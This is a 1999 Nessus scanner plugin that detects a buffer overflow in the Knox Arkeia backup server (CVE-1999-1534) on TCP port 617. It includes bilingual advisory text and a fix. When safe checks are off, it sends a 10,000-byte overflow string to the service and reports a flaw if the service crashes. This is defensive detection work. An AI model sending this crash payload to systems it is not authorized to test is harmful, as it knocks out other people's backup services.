#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# Found by Brock Tellier <btellier@webley.com>

if(description)
{ 
 script_id(10018);
 script_bugtraq_id(661);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-1999-1534");
 name["english"] = "Knox Arkeia buffer overflow";
 name["francais"] = "Dépassement de buffer dans Arkeia de Knox";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to overflow a buffer in the remote Knox's 
Arkeia server.

This problem allows an attacker to perform a denial of service 
attack and to gain root remotely on this service.

Solution : upgrade to the latest version of Arkeia and/or filter
incoming traffic to TCP port 617.

Risk factor : High";

 desc["francais"] = "
Il s'est avéré possible de faire planter le serveur Arkeia
distant.

Ce problème peut permettre à un pirate de passer root sur
ce système.

Solution : mettez à jour Arkeia en sa dernière version et/ou
filtrez le traffic entrant vers le port TCP 617.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "arkeia buffer overflow";
 summary["francais"] = "Dépassement de buffer dans arkeia";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("arkeia_default_account.nasl");
 script_require_ports(617);
 exit(0);
}

#
# The script code starts here
#

include("misc_func.inc");

port = 617;
version = get_kb_item("arkeia-client/617");
if ( ! version ) exit(0);
if ( !ereg(pattern:"^[0-4]\.", string:version) )  exit(0);

if(safe_checks())
{
 security_hole(port);
 exit(0);
}


if(get_port_state(port))
{
 data = crap(10000);
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  send(socket:soc, data:data);
  close(soc);
  sleep(2);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else close(soc2);
 }
}
